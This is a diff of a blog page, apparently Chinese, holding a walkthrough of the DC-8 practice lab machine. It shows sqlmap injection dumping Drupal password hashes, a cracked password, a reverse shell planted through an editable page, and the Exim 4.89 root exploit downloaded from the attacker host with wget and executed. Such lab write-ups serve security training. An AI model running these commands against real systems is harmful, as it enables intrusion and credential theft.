@@ -279,14 +279,14 @@
                 <i class="far fa-file-word"></i>
               </span>
                 <span class="post-meta-item-text">本文字数：</span>
-              <span>4.9k</span>
+              <span>5k</span>
             </span>
             <span class="post-meta-item" title="阅读时长">
               <span class="post-meta-item-icon">
                 <i class="far fa-clock"></i>
               </span>
                 <span class="post-meta-item-text">阅读时长 &asymp;</span>
-              <span>4 分钟</span>
+              <span>5 分钟</span>
             </span>
             <div class="post-description"> </div>
 
@@ -299,68 +299,133 @@
     <div class="post-body" itemprop="articleBody">
 
       
-        <h3 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h3><h4 id="环境"><a href="#环境" class="headerlink" title="环境"></a>环境</h4><blockquote>
-<p>网段     192.168.18.0/24</p>
-<p>kali        192.168.18.131</p>
-<p>靶机        192.168.18.141</p>
+        <h3 id="信息收集">信息收集</h3>
+<h4 id="环境">环境</h4>
+<blockquote>
+<p>网段 192.168.18.0/24</p>
+<p>kali 192.168.18.131</p>
+<p>靶机 192.168.18.141</p>
 </blockquote>
-<h4 id="扫描网段"><a href="#扫描网段" class="headerlink" title="扫描网段"></a>扫描网段</h4><blockquote>
-<p> kali@kali2020:~$ sudo nmap 192.168.18.0/24 -sn<br>[sudo] kali 的密码：<br>Starting Nmap 7.91 ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-08 21:27 CST<br>Nmap scan report for 192.168.18.2<br>Host is up (0.00035s latency).<br>MAC Address: 00:50:56:E0:DA:9A (VMware)<br>Nmap scan report for 192.168.18.141<br>Host is up (0.00063s latency).<br>MAC Address: 00:0C:29:F3:39:D5 (VMware)<br>Nmap scan report for 192.168.18.254<br>Host is up (0.00032s latency).<br>MAC Address: 00:50:56:FD:0E:3D (VMware)<br>Nmap scan report for 192.168.18.131<br>Host is up.<br>Nmap done: 256 IP addresses (4 hosts up) scanned in 3.53 seconds</p>
+<h4 id="扫描网段">扫描网段</h4>
+<blockquote>
+<p>kali@kali2020:~$ sudo nmap 192.168.18.0/24 -sn [sudo] kali 的密码：
+Starting Nmap 7.91 ( https://nmap.org ) at 2021-05-08 21:27 CST Nmap
+scan report for 192.168.18.2 Host is up (0.00035s latency). MAC Address:
+00:50:56:E0:DA:9A (VMware) Nmap scan report for 192.168.18.141 Host is
+up (0.00063s latency). MAC Address: 00:0C:29:F3:39:D5 (VMware) Nmap scan
+report for 192.168.18.254 Host is up (0.00032s latency). MAC Address:
+00:50:56:FD:0E:3D (VMware) Nmap scan report for 192.168.18.131 Host is
+up. Nmap done: 256 IP addresses (4 hosts up) scanned in 3.53 seconds</p>
 </blockquote>
-<h4 id="扫描靶机"><a href="#扫描靶机" class="headerlink" title="扫描靶机"></a>扫描靶机</h4><blockquote>
-<p> kali@kali2020:~$ sudo nmap 192.168.18.141 -p- -sV<br>Starting Nmap 7.91 ( <a target="_blank" rel="noopener" href="https://nmap.org/">https://nmap.org</a> ) at 2021-05-08 21:30 CST<br>Nmap scan report for 192.168.18.141<br>Host is up (0.0015s latency).<br>Not shown: 65533 closed ports<br>PORT   STATE SERVICE VERSION<br>22/tcp open  ssh     OpenSSH 7.4p1 Debian 10+deb9u1 (protocol 2.0)<br>80/tcp open  http    Apache httpd<br>MAC Address: 00:0C:29:F3:39:D5 (VMware)<br>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</p>
-<p>Service detection performed. Please report any incorrect results at <a target="_blank" rel="noopener" href="https://nmap.org/submit/">https://nmap.org/submit/</a> .<br>Nmap done: 1 IP address (1 host up) scanned in 18.93 seconds</p>
+<h4 id="扫描靶机">扫描靶机</h4>
+<blockquote>
+<p>kali@kali2020:~$ sudo nmap 192.168.18.141 -p- -sV Starting Nmap 7.91
+( https://nmap.org ) at 2021-05-08 21:30 CST Nmap scan report for
+192.168.18.141 Host is up (0.0015s latency). Not shown: 65533 closed
+ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.4p1 Debian
+10+deb9u1 (protocol 2.0) 80/tcp open http Apache httpd MAC Address:
+00:0C:29:F3:39:D5 (VMware) Service Info: OS: Linux; CPE:
+cpe:/o:linux:linux_kernel</p>
+<p>Service detection performed. Please report any incorrect results at
+https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned
+in 18.93 seconds</p>
 </blockquote>
-<h4 id="dirsearch扫目录"><a href="#dirsearch扫目录" class="headerlink" title="dirsearch扫目录"></a>dirsearch扫目录</h4><blockquote>
+<h4 id="dirsearch扫目录">dirsearch扫目录</h4>
+<blockquote>
 <p>sudo python3 dirsearch -u 192.168.18.141</p>
 </blockquote>
 <p>没扫到什么东西，换dirb扫到了</p>
 <p><code>http://192.168.18.141/user</code></p>
-<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><p>进入主页,点左侧的Details下的链接，发现url处有个nid的参数，看看这里是否存在sql注入</p>
+<h3 id="sql注入">sql注入</h3>
+<p>进入主页,点左侧的Details下的链接，发现url处有个nid的参数，看看这里是否存在sql注入</p>
 <p>sqlmap跑一下</p>
 <p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch</code></p>
 <p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch --dbs</code></p>
 <blockquote>
-<p>available databases [2]:<br>[*] d7db<br>[*] information_schema</p>
+<p>available databases [2]:<br>
+[*] d7db [*] information_schema</p>
 </blockquote>
 <p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db --tables</code></p>
 <blockquote>
-<p> Database: d7db<br>[88 tables]<br>+—————————–+<br>| filter                      |<br>| system                      |<br>| actions                     |<br>| authmap                     |<br>| batch                       |<br>| block                       |<br>| block_custom                |<br>| block_node_type             |<br>| block_role                  |<br>| blocked_ips                 |<br>| cache                       |<br>| cache_block                 |<br>| cache_bootstrap             |<br>| cache_field                 |<br>| cache_filter                |<br>| cache_form                  |<br>| cache_image                 |<br>| cache_menu                  |<br>| cache_page                  |<br>| cache_path                  |<br>| cache_views                 |<br>| cache_views_data            |<br>| ckeditor_input_format       |<br>| ckeditor_settings           |<br>| ctools_css_cache            |<br>| ctools_object_cache         |<br>| date_format_locale          |<br>| date_format_type            |<br>| date_formats                |<br>| field_config                |<br>| field_config_instance       |<br>| field_data_body             |<br>| field_data_field_image      |<br>| field_data_field_tags       |<br>| field_revision_body         |<br>| field_revision_field_image  |<br>| field_revision_field_tags   |<br>| file_managed                |<br>| file_usage                  |<br>| filter_format               |<br>| flood                       |<br>| history                     |<br>| image_effects               |<br>| image_styles                |<br>| menu_custom                 |<br>| menu_links                  |<br>| menu_router                 |<br>| node                        |<br>| node_access                 |<br>| node_revision               |<br>| node_type                   |<br>| queue                       |<br>| rdf_mapping                 |<br>| registry                    |<br>| registry_file               |<br>| role                        |<br>| role_permission             |<br>| search_dataset              |<br>| search_index                |<br>| search_node_links           |<br>| search_total                |<br>| semaphore                   |<br>| sequences                   |<br>| sessions                    |<br>| shortcut_set                |<br>| shortcut_set_users          |<br>| site_messages_table         |<br>| taxonomy_index              |<br>| taxonomy_term_data          |<br>| taxonomy_term_hierarchy     |<br>| taxonomy_vocabulary         |<br>| url_alias                   |<br>| users                       |<br>| users_roles                 |<br>| variable                    |<br>| views_display               |<br>| views_view                  |<br>| watchdog                    |<br>| webform                     |<br>| webform_component           |<br>| webform_conditional         |<br>| webform_conditional_actions |<br>| webform_conditional_rules   |<br>| webform_emails              |<br>| webform_last_download       |<br>| webform_roles               |<br>| webform_submissions         |<br>| webform_submitted_data      |<br>+—————————–+</p>
+<p>Database: d7db<br>
+[88 tables] +-----------------------------+ | filter | | system | |
+actions | | authmap | | batch | | block | | block_custom | |
+block_node_type | | block_role | | blocked_ips | | cache | | cache_block
+| | cache_bootstrap | | cache_field | | cache_filter | | cache_form | |
+cache_image | | cache_menu | | cache_page | | cache_path | | cache_views
+| | cache_views_data | | ckeditor_input_format | | ckeditor_settings | |
+ctools_css_cache | | ctools_object_cache | | date_format_locale | |
+date_format_type | | date_formats | | field_config | |
+field_config_instance | | field_data_body | | field_data_field_image | |
+field_data_field_tags | | field_revision_body | |
+field_revision_field_image | | field_revision_field_tags | |
+file_managed | | file_usage | | filter_format | | flood | | history | |
+image_effects | | image_styles | | menu_custom | | menu_links | |
+menu_router | | node | | node_access | | node_revision | | node_type | |
+queue | | rdf_mapping | | registry | | registry_file | | role | |
+role_permission | | search_dataset | | search_index | |
+search_node_links | | search_total | | semaphore | | sequences | |
+sessions | | shortcut_set | | shortcut_set_users | | site_messages_table
+| | taxonomy_index | | taxonomy_term_data | | taxonomy_term_hierarchy |
+| taxonomy_vocabulary | | url_alias | | users | | users_roles | |
+variable | | views_display | | views_view | | watchdog | | webform | |
+webform_component | | webform_conditional | |
+webform_conditional_actions | | webform_conditional_rules | |
+webform_emails | | webform_last_download | | webform_roles | |
+webform_submissions | | webform_submitted_data |
++-----------------------------+</p>
 </blockquote>
 <p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db -T users --columns</code></p>
 <blockquote>
-<p> Database: d7db<br>Table: users<br>[16 columns]<br>+——————+——————+<br>| Column           | Type             |<br>+——————+——————+<br>| language         | varchar(12)      |<br>| access           | int(11)          |<br>| created          | int(11)          |<br>| data             | longblob         |<br>| init             | varchar(254)     |<br>| login            | int(11)          |<br>| mail             | varchar(254)     |<br>| name             | varchar(60)      |<br>| pass             | varchar(128)     |<br>| picture          | int(11)          |<br>| signature        | varchar(255)     |<br>| signature_format | varchar(255)     |<br>| status           | tinyint(4)       |<br>| theme            | varchar(255)     |<br>| timezone         | varchar(32)      |<br>| uid              | int(10) unsigned |</p>
+<p>Database: d7db<br>
+Table: users [16 columns] +------------------+------------------+ |
+Column | Type | +------------------+------------------+ | language |
+varchar(12) | | access | int(11) | | created | int(11) | | data |
+longblob | | init | varchar(254) | | login | int(11) | | mail |
+varchar(254) | | name | varchar(60) | | pass | varchar(128) | | picture
+| int(11) | | signature | varchar(255) | | signature_format |
+varchar(255) | | status | tinyint(4) | | theme | varchar(255) | |
+timezone | varchar(32) | | uid | int(10) unsigned |</p>
 </blockquote>
-<br>
-
+<p><br></p>
 <p><code>sqlmap -u http://192.168.18.141/?nid=3 --batch -D d7db -T users -C name,pass -dump</code></p>
 <blockquote>
-<p>Database: d7db<br>Table: users<br>[2 entries]<br>+——-+———————————————————+<br>| name  | pass                                                    |<br>+——-+———————————————————+<br>| admin | $S$D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z |<br>| john  | $S$DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF |<br>+——-+———————————————————+</p>
+<p>Database: d7db<br>
+Table: users [2 entries]
++-------+---------------------------------------------------------+ |
+name | pass |
++-------+---------------------------------------------------------+ |
+admin | <span class="math inline">\(S\)</span>D2tRcYRyqVFNSc0NvYUrYeQbLQg5koMKtihYTIDC9QQqJi3ICg5z
+| | john | <span class="math inline">\(S\)</span>DqupvJbxVmqjr6cYePnx2A891ln7lsuku/3if/oRVZJaz5mKC2vF
+|
++-------+---------------------------------------------------------+</p>
 </blockquote>
-<p>跑出来两条数据 ，但是密码是加密的，根据john用户名提示，使用<code>john</code>解密</p>
-<br>
-
+<p>跑出来两条数据
+，但是密码是加密的，根据john用户名提示，使用<code>john</code>解密</p>
+<p><br></p>
 <p><code>admin</code> 使用john没跑出来</p>
 <p><code>john</code> 密码为<code>turtle</code></p>
 <p><code>http://192.168.18.141/user/</code>登录成功</p>
 <p>打开content看看</p>
 <p><img src="/posts/437699f/content.png"></p>
-<br>
-
-<h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><p>contact us页面可以编辑</p>
+<p><br></p>
+<h3 id="反弹shell">反弹shell</h3>
+<p>contact us页面可以编辑</p>
 <p>修改成php格式</p>
 <p><img src="/posts/437699f/ncshell.png"></p>
 <p><img src="/posts/437699f/submit.png"></p>
 <p>反弹交互shell</p>
-<p><code>python -c &#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</code></p>
+<p><code>python -c 'import pty;pty.spawn("/bin/bash")'</code></p>
 <p><img src="/posts/437699f/python_shell.png"></p>
-<h3 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h3><p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>  查看具有root权限的命令</p>
+<h3 id="提权">提权</h3>
+<p><code>find / -perm -u=s -type f 2&gt;/dev/null</code>
+查看具有root权限的命令</p>
 <p><img src="/posts/437699f/find.png"></p>
 <p>试着利用下exim4</p>
 <p>查看exim4版本</p>
 <p><code>exim4 --version</code></p>
 <blockquote>
-<p>Exim version 4.89 </p>
+<p>Exim version 4.89</p>
 </blockquote>
 <p><code>searchsploit  exim 4</code></p>
 <p>找下exp，选择46996.sh,拷贝到本地，并开启kali的http服务</p>
@@ -370,23 +435,23 @@
 </blockquote>
 <p>在靶机上下载kali的shell,先回到/tmp 目录下</p>
 <blockquote>
-<p>wget <a target="_blank" rel="noopener" href="http://192.168.18.131:8000/dc8.sh">http://192.168.18.131:8000/dc8.sh</a></p>
+<p>wget http://192.168.18.131:8000/dc8.sh</p>
 </blockquote>
-<p>注意:直接把exp下载过去是无法使用的，<code>sed -i -e &#39;s/\r$//&#39; dc8.sh</code></p>
+<p>注意:直接把exp下载过去是无法使用的，<code>sed -i -e 's/\r$//' dc8.sh</code></p>
 <blockquote>
-<p>www-data@dc-8:/tmp$ ls<br>ls<br>getShell.sh<br>www-data@dc-8:/tmp$ chmod 777 dc8.sh<br>chmod 777 dc8.sh<br>www-data@dc-8:/tmp$ ./dc8.sh</p>
+<p>www-data@dc-8:/tmp$ ls ls getShell.sh www-data@dc-8:/tmp$ chmod 777
+dc8.sh<br>
+chmod 777 dc8.sh www-data@dc-8:/tmp$ ./dc8.sh</p>
 </blockquote>
 <p>看下提示用法</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"># Usage (setuid method):</span><br><span class="line"></span><br><span class="line"># $ id</span><br><span class="line"># uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]</span><br><span class="line"># $ ./raptor_exim_wiz -m setuid</span><br><span class="line"># Preparing setuid shell helper...</span><br><span class="line"># Delivering setuid payload...</span><br><span class="line"># [...]</span><br><span class="line"># Waiting 5 seconds...</span><br><span class="line"># -rwsr-xr-x 1 root raptor 8744 Jun 16 13:03 /tmp/pwned</span><br><span class="line"># # id</span><br><span class="line"># uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">#</span><br><span class="line"># Usage (netcat method):</span><br><span class="line"># $ id</span><br><span class="line"># uid=1000(raptor) gid=1000(raptor) groups=1000(raptor) [...]</span><br><span class="line"># $ ./raptor_exim_wiz -m netcat</span><br><span class="line"># Delivering netcat payload...</span><br><span class="line"># Waiting 5 seconds...</span><br><span class="line"># localhost [127.0.0.1] 31337 (?) open</span><br><span class="line"># id</span><br><span class="line"># uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">#</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-
 <p><img src="/posts/437699f/flag.png"></p>
-<br>
-
-<br>
-
+<p><br></p>
+<p><br></p>
 <blockquote>
-<h4 id="Reference"><a href="#Reference" class="headerlink" title="Reference"></a>Reference</h4><p><a target="_blank" rel="noopener" href="https://www.freebuf.com/articles/web/261074.html">https://www.freebuf.com/articles/web/261074.html</a></p>
-<p><a target="_blank" rel="noopener" href="https://my.oschina.net/u/3896378/blog/4427624">https://my.oschina.net/u/3896378/blog/4427624</a></p>
+<h4 id="reference">Reference</h4>
+<p>https://www.freebuf.com/articles/web/261074.html</p>
+<p>https://my.oschina.net/u/3896378/blog/4427624</p>
 </blockquote>
 
     </div>
@@ -517,7 +582,7 @@
 
       <!--noindex-->
       <div class="post-toc-wrap sidebar-panel">
-          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">1.1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F%E7%BD%91%E6%AE%B5"><span class="nav-number">1.2.</span> <span class="nav-text">扫描网段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F%E9%9D%B6%E6%9C%BA"><span class="nav-number">1.3.</span> <span class="nav-text">扫描靶机</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dirsearch%E6%89%AB%E7%9B%AE%E5%BD%95"><span class="nav-number">1.4.</span> <span class="nav-text">dirsearch扫目录</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">3.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#Reference"><span class="nav-number">4.1.</span> <span class="nav-text">Reference</span></a></li></ol></li></ol></div>
+          <div class="post-toc motion-element"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86"><span class="nav-number">1.</span> <span class="nav-text">信息收集</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E7%8E%AF%E5%A2%83"><span class="nav-number">1.1.</span> <span class="nav-text">环境</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F%E7%BD%91%E6%AE%B5"><span class="nav-number">1.2.</span> <span class="nav-text">扫描网段</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E6%89%AB%E6%8F%8F%E9%9D%B6%E6%9C%BA"><span class="nav-number">1.3.</span> <span class="nav-text">扫描靶机</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#dirsearch%E6%89%AB%E7%9B%AE%E5%BD%95"><span class="nav-number">1.4.</span> <span class="nav-text">dirsearch扫目录</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql%E6%B3%A8%E5%85%A5"><span class="nav-number">2.</span> <span class="nav-text">sql注入</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%8F%8D%E5%BC%B9shell"><span class="nav-number">3.</span> <span class="nav-text">反弹shell</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%8F%90%E6%9D%83"><span class="nav-number">4.</span> <span class="nav-text">提权</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#reference"><span class="nav-number">4.1.</span> <span class="nav-text">Reference</span></a></li></ol></li></ol></div>
       </div>
       <!--/noindex-->
 
@@ -533,7 +598,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">193</span>
+          <span class="site-state-item-count">194</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -581,7 +646,7 @@
 <div class="copyright">
   
   &copy; 
-  <span itemprop="copyrightYear">2024</span>
+  <span itemprop="copyrightYear">2025</span>
   <span class="with-love">
     <i class="fa fa-heart"></i>
   </span>
@@ -595,7 +660,7 @@
     <span class="post-meta-item-icon">
       <i class="fa fa-coffee"></i>
     </span>
-    <span title="站点阅读时长">19:10</span>
+    <span title="站点阅读时长">19:09</span>
 </div>
 
 <!--
@@ -606,7 +671,7 @@
 <!--
 <div class="theme-info">
   <div class="powered-by"></div>
-  <span class="post-count">博客全站共266.3k字</span>
+  <span class="post-count">博客全站共267.3k字</span>
 </div>
 -->
         
@@ -746,6 +811,63 @@ window.addEventListener('pjax:success', () => {
 
     <div id="pjax">
   
+
+  
+      
+
+<script>
+  if (typeof MathJax === 'undefined') {
+    window.MathJax = {
+      loader: {
+          load: ['[tex]/mhchem'],
+        source: {
+          '[tex]/amsCd': '[tex]/amscd',
+          '[tex]/AMScd': '[tex]/amscd'
+        }
+      },
+      tex: {
+        inlineMath: {'[+]': [['$', '$']]},
+          packages: {'[+]': ['mhchem']},
+        tags: 'ams'
+      },
+      options: {
+        renderActions: {
+          findScript: [10, doc => {
+            document.querySelectorAll('script[type^="math/tex"]').forEach(node => {
+              const display = !!node.type.match(/; *mode=display/);
+              const math = new doc.options.MathItem(node.textContent, doc.inputJax[0], display);
+              const text = document.createTextNode('');
+              node.parentNode.replaceChild(text, node);
+              math.start = {node: text, delim: '', n: 0};
+              math.end = {node: text, delim: '', n: 0};
+              doc.math.push(math);
+            });
+          }, '', false],
+          insertedScript: [200, () => {
+            document.querySelectorAll('mjx-container').forEach(node => {
+              let target = node.parentNode;
+              if (target.nodeName.toLowerCase() === 'li') {
+                target.parentNode.classList.add('has-jax');
+              }
+            });
+          }, '', false]
+        }
+      }
+    };
+    (function () {
+      var script = document.createElement('script');
+      script.src = '//cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js';
+      script.defer = true;
+      document.head.appendChild(script);
+    })();
+  } else {
+    MathJax.startup.document.state(0);
+    MathJax.texReset();
+    MathJax.typeset();
+  }
+</script>
+
+    
 
   
 
